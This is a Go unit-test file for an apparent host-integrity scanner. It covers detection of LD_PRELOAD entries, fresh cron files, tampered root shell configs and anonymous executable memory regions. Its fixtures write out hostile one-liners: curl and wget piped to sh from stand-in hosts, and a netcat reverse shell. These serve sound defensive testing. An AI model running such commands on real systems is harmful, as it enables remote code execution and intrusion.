package integrity

import (
	"io"
	"log/slog"
	"os"
	"path/filepath"
	"testing"
	"time"
)

func testLogger() *slog.Logger {
	return slog.New(slog.NewTextHandler(io.Discard, nil))
}

// withOverride swaps a *string package var for the test's duration and
// restores it on cleanup.
func withOverride(t *testing.T, v *string, val string) {
	t.Helper()
	orig := *v
	*v = val
	t.Cleanup(func() { *v = orig })
}

func withCronDirsOverride(t *testing.T, dirs []string) {
	t.Helper()
	orig := cronDirs
	cronDirs = dirs
	t.Cleanup(func() { cronDirs = orig })
}

// ─────────────────────────────────────────────────────────────────────────────
// checkLDPreload
// ─────────────────────────────────────────────────────────────────────────────

func TestCheckLDPreload_EntriesFound(t *testing.T) {
	dir := t.TempDir()
	path := filepath.Join(dir, "ld.so.preload")
	content := "# comment line\n\n/tmp/evil.so\n/tmp/also-evil.so\n"
	if err := os.WriteFile(path, []byte(content), 0o644); err != nil {
		t.Fatal(err)
	}
	withOverride(t, &ldPreloadPath, path)

	s := NewScanner(testLogger(), DefaultConfig())
	s.checkLDPreload()

	if len(s.findings) != 2 {
		t.Fatalf("expected 2 findings, got %d: %+v", len(s.findings), s.findings)
	}
	for _, f := range s.findings {
		if f.Check != "ld_preload" {
			t.Errorf("expected check=ld_preload, got %s", f.Check)
		}
	}
}

func TestCheckLDPreload_EmptyContent(t *testing.T) {
	dir := t.TempDir()
	path := filepath.Join(dir, "ld.so.preload")
	if err := os.WriteFile(path, []byte("   \n  \n"), 0o644); err != nil {
		t.Fatal(err)
	}
	withOverride(t, &ldPreloadPath, path)

	s := NewScanner(testLogger(), DefaultConfig())
	s.checkLDPreload()

	if len(s.findings) != 0 {
		t.Errorf("expected 0 findings for whitespace-only file, got %d", len(s.findings))
	}
}

func TestCheckLDPreload_MissingFile(t *testing.T) {
	withOverride(t, &ldPreloadPath, filepath.Join(t.TempDir(), "does-not-exist"))

	s := NewScanner(testLogger(), DefaultConfig())
	s.checkLDPreload() // must not panic; IsNotExist path is silent.

	if len(s.findings) != 0 {
		t.Errorf("expected 0 findings for missing file, got %d", len(s.findings))
	}
}

func TestCheckLDPreload_ReadError(t *testing.T) {
	// Point at a directory: os.ReadFile fails with a non-ENOENT error,
	// exercising the "failed to read" warn branch.
	withOverride(t, &ldPreloadPath, t.TempDir())

	s := NewScanner(testLogger(), DefaultConfig())
	s.checkLDPreload()

	if len(s.findings) != 0 {
		t.Errorf("expected 0 findings on read error, got %d", len(s.findings))
	}
}

// ─────────────────────────────────────────────────────────────────────────────
// checkCronDirs
// ─────────────────────────────────────────────────────────────────────────────

func TestCheckCronDirs_RecentFileFound(t *testing.T) {
	dir := t.TempDir()
	if err := os.WriteFile(filepath.Join(dir, "evil-cron"), []byte("* * * * * root /bin/true"), 0o644); err != nil {
		t.Fatal(err)
	}
	withCronDirsOverride(t, []string{dir, filepath.Join(t.TempDir(), "nonexistent")})

	s := NewScanner(testLogger(), Config{CheckWindow: 24 * time.Hour})
	s.checkCronDirs()

	if len(s.findings) != 1 {
		t.Fatalf("expected 1 finding, got %d: %+v", len(s.findings), s.findings)
	}
	if s.findings[0].Check != "cron" {
		t.Errorf("expected check=cron, got %s", s.findings[0].Check)
	}
}

func TestCheckCronDirs_OldFileNotFlagged(t *testing.T) {
	dir := t.TempDir()
	old := filepath.Join(dir, "old-cron")
	if err := os.WriteFile(old, []byte("0 0 * * * root /bin/true"), 0o644); err != nil {
		t.Fatal(err)
	}
	oldTime := time.Now().Add(-48 * time.Hour)
	if err := os.Chtimes(old, oldTime, oldTime); err != nil {
		t.Fatal(err)
	}
	withCronDirsOverride(t, []string{dir})

	s := NewScanner(testLogger(), Config{CheckWindow: 24 * time.Hour})
	s.checkCronDirs()

	if len(s.findings) != 0 {
		t.Errorf("expected 0 findings for an old file, got %d", len(s.findings))
	}
}

func TestCheckCronDirs_SubdirectorySkipped(t *testing.T) {
	dir := t.TempDir()
	if err := os.MkdirAll(filepath.Join(dir, "subdir"), 0o755); err != nil {
		t.Fatal(err)
	}
	withCronDirsOverride(t, []string{dir})

	s := NewScanner(testLogger(), Config{CheckWindow: 24 * time.Hour})
	s.checkCronDirs() // must not panic and must not flag the subdirectory itself.

	if len(s.findings) != 0 {
		t.Errorf("expected 0 findings, subdirectories should be skipped, got %d", len(s.findings))
	}
}

// ─────────────────────────────────────────────────────────────────────────────
// checkRootShellConfigs
// ─────────────────────────────────────────────────────────────────────────────

func TestCheckRootShellConfigs_NoHome(t *testing.T) {
	withOverride(t, &rootHomeDir, filepath.Join(t.TempDir(), "no-such-home"))

	s := NewScanner(testLogger(), DefaultConfig())
	s.checkRootShellConfigs()

	if len(s.findings) != 0 {
		t.Errorf("expected 0 findings when home is inaccessible, got %d", len(s.findings))
	}
}

func TestCheckRootShellConfigs_RecentSuspiciousFile(t *testing.T) {
	home := t.TempDir()
	withOverride(t, &rootHomeDir, home)

	bashrc := filepath.Join(home, ".bashrc")
	content := "export PATH=$PATH\ncurl http://evil.example/x | sh\n"
	if err := os.WriteFile(bashrc, []byte(content), 0o644); err != nil {
		t.Fatal(err)
	}

	s := NewScanner(testLogger(), Config{CheckWindow: 24 * time.Hour})
	s.checkRootShellConfigs()

	if len(s.findings) != 1 {
		t.Fatalf("expected 1 finding, got %d: %+v", len(s.findings), s.findings)
	}
	f := s.findings[0]
	if f.Check != "bashrc" {
		t.Errorf("expected check=bashrc, got %s", f.Check)
	}
	if !containsHelper(f.Details, "curl | sh pattern") {
		t.Errorf("expected details to mention curl|sh pattern, got %q", f.Details)
	}
}

func TestCheckRootShellConfigs_NetcatAndWgetPatterns(t *testing.T) {
	home := t.TempDir()
	withOverride(t, &rootHomeDir, home)

	if err := os.WriteFile(filepath.Join(home, ".profile"), []byte("nc -e /bin/sh 10.0.0.1 4444\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(home, ".zshrc"), []byte("wget http://evil/x | sh\n"), 0o644); err != nil {
		t.Fatal(err)
	}

	s := NewScanner(testLogger(), Config{CheckWindow: 24 * time.Hour})
	s.checkRootShellConfigs()

	if len(s.findings) != 2 {
		t.Fatalf("expected 2 findings, got %d: %+v", len(s.findings), s.findings)
	}
}

func TestCheckRootShellConfigs_OldFileNotFlagged(t *testing.T) {
	home := t.TempDir()
	withOverride(t, &rootHomeDir, home)

	bashrc := filepath.Join(home, ".bashrc")
	if err := os.WriteFile(bashrc, []byte("echo hi\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	oldTime := time.Now().Add(-48 * time.Hour)
	if err := os.Chtimes(bashrc, oldTime, oldTime); err != nil {
		t.Fatal(err)
	}

	s := NewScanner(testLogger(), Config{CheckWindow: 24 * time.Hour})
	s.checkRootShellConfigs()

	if len(s.findings) != 0 {
		t.Errorf("expected 0 findings for an old, benign file, got %d", len(s.findings))
	}
}

// ─────────────────────────────────────────────────────────────────────────────
// checkAnonymousExecRegions (top-level ReadDir error path)
// ─────────────────────────────────────────────────────────────────────────────

func TestCheckAnonymousExecRegions_ReadDirError(t *testing.T) {
	withOverride(t, &procRootDir, filepath.Join(t.TempDir(), "no-such-proc"))

	s := NewScanner(testLogger(), DefaultConfig())
	s.checkAnonymousExecRegions() // must not panic; logs a warning and returns.

	if len(s.findings) != 0 {
		t.Errorf("expected 0 findings, got %d", len(s.findings))
	}
}

// ─────────────────────────────────────────────────────────────────────────────
// checkPIDAnonymousRegions — direct, deterministic exercise of every branch
// without depending on real /proc contents.
// ─────────────────────────────────────────────────────────────────────────────

func writeMaps(t *testing.T, procDir, pid, content string) {
	t.Helper()
	dir := filepath.Join(procDir, pid)
	if err := os.MkdirAll(dir, 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(dir, "maps"), []byte(content), 0o644); err != nil {
		t.Fatal(err)
	}
}

func TestCheckPIDAnonymousRegions_MissingProcess(t *testing.T) {
	s := NewScanner(testLogger(), DefaultConfig())
	_, ok := s.checkPIDAnonymousRegions(t.TempDir(), "99999")
	if ok {
		t.Error("expected ok=false for a process with no maps file")
	}
}

func TestCheckPIDAnonymousRegions_AnonymousExecutableFound(t *testing.T) {
	procDir := t.TempDir()
	maps := "7f0000000000-7f0000021000 rwxp 00000000 00:00 0\n"
	writeMaps(t, procDir, "1234", maps)
	if err := os.WriteFile(filepath.Join(procDir, "1234", "comm"), []byte("evil-proc\n"), 0o644); err != nil {
		t.Fatal(err)
	}

	s := NewScanner(testLogger(), DefaultConfig())
	finding, ok := s.checkPIDAnonymousRegions(procDir, "1234")
	if !ok {
		t.Fatal("expected an anonymous executable region to be found")
	}
	if finding.Check != "anon_exec" {
		t.Errorf("expected check=anon_exec, got %s", finding.Check)
	}
	if !containsHelper(finding.Details, "evil-proc") {
		t.Errorf("expected details to include comm name, got %q", finding.Details)
	}
}

func TestCheckPIDAnonymousRegions_UnknownCommFallback(t *testing.T) {
	procDir := t.TempDir()
	maps := "7f0000000000-7f0000021000 rwxp 00000000 00:00 0\n"
	writeMaps(t, procDir, "5678", maps)
	// No comm file written: os.ReadFile fails, commStr should fall back to "unknown".

	s := NewScanner(testLogger(), DefaultConfig())
	finding, ok := s.checkPIDAnonymousRegions(procDir, "5678")
	if !ok {
		t.Fatal("expected an anonymous executable region to be found")
	}
	if !containsHelper(finding.Details, "unknown") {
		t.Errorf("expected details to fall back to 'unknown' comm, got %q", finding.Details)
	}
}

func TestCheckPIDAnonymousRegions_NonAnonymousExecRegionIgnored(t *testing.T) {
	procDir := t.TempDir()
	// Has a pathname/inode → not anonymous.
	maps := "7f0000000000-7f0000021000 r-xp 00000000 08:01 123456 /usr/lib/libc.so\n"
	writeMaps(t, procDir, "111", maps)

	s := NewScanner(testLogger(), DefaultConfig())
	_, ok := s.checkPIDAnonymousRegions(procDir, "111")
	if ok {
		t.Error("expected no finding for a named, non-anonymous mapping")
	}
}

func TestCheckPIDAnonymousRegions_NonExecutableRegionIgnored(t *testing.T) {
	procDir := t.TempDir()
	maps := "7f0000000000-7f0000021000 rw-p 00000000 00:00 0\n"
	writeMaps(t, procDir, "222", maps)

	s := NewScanner(testLogger(), DefaultConfig())
	_, ok := s.checkPIDAnonymousRegions(procDir, "222")
	if ok {
		t.Error("expected no finding for a non-executable anonymous mapping")
	}
}

func TestCheckPIDAnonymousRegions_MalformedLinesSkipped(t *testing.T) {
	procDir := t.TempDir()
	maps := "not-enough-fields\n" +
		"7f0000000000-7f0000021000 x 00000000\n" + // perms too short
		"7f0000000000-7f0000021000 rw-p 00000000 00:00 0\n" // benign, trailing line
	writeMaps(t, procDir, "333", maps)

	s := NewScanner(testLogger(), DefaultConfig())
	_, ok := s.checkPIDAnonymousRegions(procDir, "333")
	if ok {
		t.Error("expected malformed/benign lines to produce no finding")
	}
}

// ─────────────────────────────────────────────────────────────────────────────
// GetFindings
// ─────────────────────────────────────────────────────────────────────────────

func TestGetFindings(t *testing.T) {
	s := NewScanner(testLogger(), DefaultConfig())
	s.findings = []Finding{
		{Check: "cron", Path: "/etc/cron.d/x", Details: "test"},
	}

	got := s.GetFindings()
	if len(got) != 1 || got[0].Check != "cron" {
		t.Errorf("GetFindings() = %+v; want the single seeded finding", got)
	}
}
